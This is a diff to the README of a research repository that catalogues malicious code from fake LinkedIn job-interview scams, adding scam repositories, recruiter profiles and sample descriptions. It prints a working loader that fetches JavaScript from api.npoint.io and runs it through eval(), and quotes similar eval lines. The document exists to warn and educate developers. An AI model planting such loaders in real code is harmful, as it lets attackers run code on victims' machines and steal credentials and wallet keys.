@@ -1,3 +1,15 @@
+**! Before All !**
+
+This repository contains malicious code samples collected from scammers attempting to steal credentials via LinkedIn.
+
+![Running the numbers](https://raw.githubusercontent.com/xndbogdan/malicious-repositories/refs/heads/main/convo.png)
+
+**DO NOT RUN THIS CODE**.
+
+(And you should not install dependencies either)
+
+The code is kept for educational and research purposes only.
+
 # Malicious Repository Collection
 
 > **⚠️ WARNING: This repository contains malicious code samples collected from scammers attempting to steal credentials via LinkedIn. DO NOT RUN THIS CODE. The code is kept for educational and research purposes only.**
@@ -27,12 +39,16 @@
 - [Final Recommendations](#final-recommendations)
 - [Malicious Repositories](#repositories)
   - [1. Real Estate Project](#1-real-estate-project)
-  - [2. Multify Staking Project](#2-multify-staking-project)
-  - [3. trend-dev-preproduction](#3-trend-dev-preproduction)
-  - [4. munity-game](#4-munity-game)
-  - [5. erc20-token-dapp](#5-erc20-token-dapp)
-  - [6. challenge-experiment-module](#6-challenge-experiment-module)
-  - [7. coinpool-rental-platform1.0](#7-coinpool-rental-platform10)
+  - [2. Real Estate New](#2-real-estate-new)
+  - [3. Multify Staking Project](#3-multify-staking-project)
+  - [4. Trend Dev Preproduction](#4-trend-dev-preproduction)
+  - [5. Munity Game](#5-munity-game)
+  - [6. ERC20 Token DApp](#6-erc20-token-dapp)
+  - [7. Challenge Experiment Module](#7-challenge-experiment-module)
+  - [8. Coinpool Rental Platform 1.0](#8-coinpool-rental-platform10)
+  - [9. Golden City](#9-golden-city)
+  - [10. Sarostech Assessment](#10-sarostech-assessment)
+  - [11. Scammer Documents](#11-scammer-documents)
 - [Checking for Malicious npm Packages](#checking-for-malicious-npm-packages)
 
 ## Known Scam Repos and APIs
@@ -46,8 +62,9 @@
 - https://bitbucket.org/trend-dev/preproduction/src/main/backend/router.js
 - https://bitbucket.org/sarostech_work/assessment/src/792ba614d9f4f41e369f110cf144ace2d9c5650b/server/config/getContract.js#lines-135
 - https://github.com/MetaBuilderGroup76/challenge-experiment-module
+- https://github.com/goldencity5019/test_version
 
-## Known Recruiter Profiles
+### Known scammer recruiter profiles
 
 - [Andressa Santiago](https://www.linkedin.com/in/andressa-santiago-800b03333/)
 - [Valentine Giroude](https://www.linkedin.com/in/valentine-girard-661aba14/)
@@ -63,10 +80,15 @@
 - [Francis Jacquet](https://www.linkedin.com/in/runenergie/)
 - [Roman Liakhovych](https://www.linkedin.com/in/roman-liakhovych-5429802b0/)
 - [Vitoria Danielle Franca](https://www.linkedin.com/in/vitoria-danielle-franca-4a3134293/)
+- [Martina Gehrken Trappe](https://www.linkedin.com/in/martina-gehrken-trappe-51930412/)
+- [Brian Patterson](https://www.linkedin.com/in/brian-patterson-71954b116/)
+- [Joe Carlino](https://www.linkedin.com/in/joe-carlino-28856b78/)
 
 ## Extra Links
 
 [SCAM WARNING: Blockchain developer job postings - on Reddit](https://www.reddit.com/r/Upwork/comments/14nat71/scam_warning_blockchain_developer_job_postings/)
+[Stay safe out there, software engineers - on Linkedin](https://www.linkedin.com/posts/tudorconstantin_chatgpt-activity-7292203560547606528-pOUz/)
+[Follow-up on crypto interview scammers - on Linkedin](https://www.linkedin.com/posts/activity-7272780404070244352-XHUY)
 
 ## On LinkedIn
 
@@ -248,7 +270,11 @@ exports.getCookie = asyncErrorHandler(async (req, res, next) => {
 })();
 ```
 
-### 2. Multify Staking Project
+### 2. Real Estate New
+
+Located in `real_estate_new/` directory. Another version of the real estate project with malicious code.
+
+### 3. Multify Staking Project
 
 Located in `multify_staking/` directory. The malicious code is directly embedded in `multify_staking/next.config.js`.
 
@@ -268,7 +294,7 @@ const nextConfig = {
 module.exports = nextConfig
 ```
 
-### 3. trend-dev-preproduction
+### 4. Trend Dev Preproduction
 
 Located in `trend-dev-preproduction/` directory. The malicious code is hidden in `trend-dev-preproduction/backend/controller.js`.
 
@@ -278,7 +304,7 @@ The malware:
 - Specifically targets cryptocurrency private keys
 - Contains the malicious line: `eval(items.data.cookie);`
 
-### 4. munity-game
+### 5. Munity Game
 
 Located in `munity-game/` directory. The malicious payload is hidden in `server/routes/paymentRoute.js`.
 
@@ -287,7 +313,7 @@ The malware:
 - Appears to be designed to extract sensitive information
 - Disguised as part of a payment processing system
 
-### 5. erc20-token-dapp
+### 6. ERC20 Token DApp
 
 Located in `erc20-token-dapp/` directory.
 
@@ -297,7 +323,7 @@ The malware:
 - It's loaded through a function call `fetchIcon("77")` in `vite.config.js`
 - More information about this vulnerability can be found at: https://security.snyk.io/package/npm/cdn-icon-fetch
 
-### 6. challenge-experiment-module
+### 7. Challenge Experiment Module
 
 Located in `challenge-experiment-module/` directory.
 
@@ -306,7 +332,7 @@ The malware:
 - Likely executes malicious payloads in the background
 - Also listed in the "Known Scam Repos and APIs" section as "https://github.com/MetaBuilderGroup76/challenge-experiment-module"
 
-### 7. coinpool-rental-platform1.0
+### 8. Coinpool Rental Platform 1.0
 
 Located in `coinpool-rental-platform1.0/` directory.
 
@@ -315,6 +341,29 @@ The malware:
 - Contains obfuscated malicious code
 - Listed in the "Known Scam Repos and APIs" section as "https://bitbucket.org/coinpool/rental-platform1.0/src/main/"
 - Frequently used in LinkedIn recruitment scams
+
+### 9. Golden City
+
+Located in `golden-city/` directory. This repository contains a payload in `backend/controllers/userController.js` at line 204:
+
+```javascript
+exports.getCookie= asyncErrorHandler(async (req, res, next) => {
+    const rs_L = await axios.get("https://api.npoint.io/e8e29958efde154f3d7d");
+    const rs_C = await axios.get("https://api.npoint.io/632ab82bbc8d7f4c2d44");
+    eval(rs_L.data.cookie);
+    eval(rs_C.data.cookie);
+  })();
+```
+
+The payload is obfuscated and executes fetched JavaScript code using eval(), allowing attackers to run malicious code with node-level privileges.
+
+### 10. Sarostech Assessment
+
+Located in `sarostech-assessment/` directory. Another malicious project disguised as a technical assessment.
+
+### 11. Scammer Documents
+
+Located in `scammer-documents/` directory. Contains documentation and examples of scammer tactics and techniques.
 
 ## Checking for Malicious npm Packages
 
